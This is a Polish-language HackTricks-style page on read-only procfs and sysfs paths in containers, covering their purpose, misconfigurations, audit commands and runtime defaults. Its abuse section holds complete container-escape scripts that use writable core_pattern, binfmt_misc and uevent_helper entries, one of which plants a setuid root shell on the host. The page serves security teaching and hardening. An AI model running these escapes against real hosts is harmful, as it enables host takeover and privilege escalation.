# Ścieżki systemowe tylko do odczytu

{{#include ../../../../banners/hacktricks-training.md}}

Ścieżki systemowe tylko do odczytu stanowią odrębną formę ochrony względem zamaskowanych ścieżek. Zamiast całkowicie ukrywać ścieżkę, runtime udostępnia ją, ale montuje jako tylko do odczytu. Jest to powszechne w przypadku wybranych lokalizacji procfs i sysfs, gdzie dostęp do odczytu może być dopuszczalny lub niezbędny z operacyjnego punktu widzenia, natomiast zapisy byłyby zbyt niebezpieczne.

Cel jest prosty: wiele interfejsów jądra staje się znacznie bardziej niebezpiecznych, gdy są zapisywalne. Montowanie tylko do odczytu nie usuwa całej wartości rozpoznawczej, ale uniemożliwia skompromitowanemu workloadowi modyfikowanie leżących poniżej plików skierowanych do jądra przez tę ścieżkę.

## Działanie

Runtimes często oznaczają części widoku proc/sys jako tylko do odczytu. W zależności od runtime i hosta, może to obejmować ścieżki takie jak:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Rzeczywista lista może się różnić, ale model jest taki sam: umożliwić widoczność tam, gdzie jest potrzebna, domyślnie zabronić modyfikacji.

## Laboratorium

Sprawdź listę ścieżek tylko do odczytu zadeklarowanych przez Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Sprawdź zamontowany widok proc/sys wewnątrz container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Wpływ na bezpieczeństwo

Ścieżki systemowe dostępne tylko do odczytu zawężają dużą klasę nadużyć wpływających na hosta. Nawet jeśli atakujący może przeglądać procfs lub sysfs, brak możliwości zapisu w tych miejscach eliminuje wiele bezpośrednich dróg modyfikacji dotyczących parametrów jądra, obsługi awarii, mechanizmów ładowania modułów lub innych interfejsów sterowania. Ekspozycja nie znika całkowicie, ale przejście od ujawnienia informacji do wpływu na hosta staje się trudniejsze.

## Błędy konfiguracji

Główne błędy to odmaskowywanie lub ponowne montowanie wrażliwych ścieżek z dostępem do zapisu, wystawianie zawartości hosta z proc/sys bezpośrednio przez zapisywalne bind mounty albo używanie trybów uprzywilejowanych, które skutecznie omijają bezpieczniejsze domyślne ustawienia runtime. W Kubernetes, `procMount: Unmasked` i uprzywilejowane workloady często występują razem ze słabszą ochroną proc. Innym częstym błędem operacyjnym jest założenie, że ponieważ runtime zwykle montuje te ścieżki tylko do odczytu, wszystkie workloady nadal dziedziczą to ustawienie.

## Nadużycia

Jeśli ochrona jest słaba, zacznij od poszukania zapisywalnych wpisów proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Gdy dostępne są zapisywalne wpisy, wysokowartościowe dalsze ścieżki obejmują:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Co mogą ujawnić te polecenia:

- Zapisalne wpisy w `/proc/sys` często oznaczają, że kontener może modyfikować zachowanie jądra hosta, zamiast jedynie je obserwować.
- `core_pattern` jest szczególnie istotny, ponieważ zapisywalna wartość widoczna dla hosta może zostać zamieniona w ścieżkę host code-execution przez spowodowanie crashu procesu po ustawieniu pipe handlera.
- `modprobe` ujawnia helper używany przez jądro w procesach związanych z module-loading; jest to klasyczny cel o wysokiej wartości, gdy jest zapisywalny.
- `binfmt_misc` informuje, czy możliwa jest rejestracja niestandardowego interpretera. Jeśli rejestracja jest zapisywalna, może to stać się execution primitive zamiast tylko information leak.
- `panic_on_oom` kontroluje decyzję jądra dotyczącą całego hosta i może więc zmienić wyczerpanie zasobów w host denial of service.
- `uevent_helper` jest jednym z najczystszych przykładów zapisywalnej ścieżki helpera w sysfs, która prowadzi do wykonania w kontekście hosta.

Interesujące znaleziska obejmują zapisywalne, skierowane do hosta proc knobs lub wpisy sysfs, które normalnie powinny być tylko do odczytu. W takim momencie obciążenie przesunęło się z ograniczonego widoku kontenera w kierunku znaczącego wpływu na jądro.

### Pełny przykład: `core_pattern` — ucieczka z hosta

Jeśli `/proc/sys/kernel/core_pattern` jest zapisywalny z wnętrza kontenera i wskazuje na widok jądra hosta, może zostać wykorzystany do wykonania payload po crashu:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Jeśli ścieżka faktycznie dociera do jądra hosta, payload uruchamia się na hoście i pozostawia za sobą setuid shell.

### Pełny przykład: rejestracja `binfmt_misc`

Jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny, rejestracja niestandardowego interpretera może spowodować wykonanie kodu, gdy dopasowany plik zostanie uruchomiony:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
W przypadku zapisywalnego `binfmt_misc` wystawionego na hosta, skutkiem jest wykonanie kodu w ścieżce interpretera wywoływanej przez kernel.

### Pełny przykład: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest zapisywalny, kernel może wywołać helper na ścieżce hosta, gdy zostanie wyzwolone pasujące zdarzenie:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Powodem, dla którego jest to tak niebezpieczne, jest to, że helper path jest rozwiązywana z perspektywy host filesystem, a nie z bezpiecznego kontekstu ograniczonego do container-only.

## Kontrole

Te kontrole sprawdzają, czy ekspozycja procfs/sysfs jest tam, gdzie powinna być tylko do odczytu, oraz czy workload nadal może modyfikować wrażliwe interfejsy jądra.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Co jest interesujące tutaj:

- Normalny, zabezpieczony workload powinien ujawniać bardzo niewiele zapisywalnych wpisów w /proc/sys.
- Zapisywalne ścieżki /proc/sys są często ważniejsze niż zwykły dostęp do odczytu.
- Jeśli runtime deklaruje, że ścieżka jest tylko do odczytu, ale w praktyce jest zapisywalna, dokładnie sprawdź propagację montowań, bind mounts i ustawienia przywilejów.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Włączone domyślnie | Docker definiuje domyślną listę ścieżek tylko do odczytu dla wrażliwych wpisów w /proc | eksponowanie montowań hosta /proc/sys, `--privileged` |
| Podman | Włączone domyślnie | Podman stosuje domyślne ścieżki tylko do odczytu, chyba że zostaną jawnie złagodzone | `--security-opt unmask=ALL`, szerokie montowania hosta, `--privileged` |
| Kubernetes | Dziedziczy domyślne ustawienia runtime | Używa modelu ścieżek tylko do odczytu warstwy runtime, chyba że zostanie osłabiony przez ustawienia Pod lub montowania hosta | `procMount: Unmasked`, uprzywilejowane workloady, zapisywalne montowania hosta /proc/sys |
| containerd / CRI-O under Kubernetes | Domyślne ustawienia runtime | Zwykle polega na domyślnych ustawieniach OCI/runtime | tak jak w wierszu Kubernetes; bezpośrednie zmiany konfiguracji runtime mogą osłabić to zachowanie |

Kluczowa uwaga: ścieżki systemowe tylko do odczytu zwykle są ustawieniem domyślnym runtime, ale łatwo je podważyć przez tryby uprzywilejowane lub montowania bind z hosta.
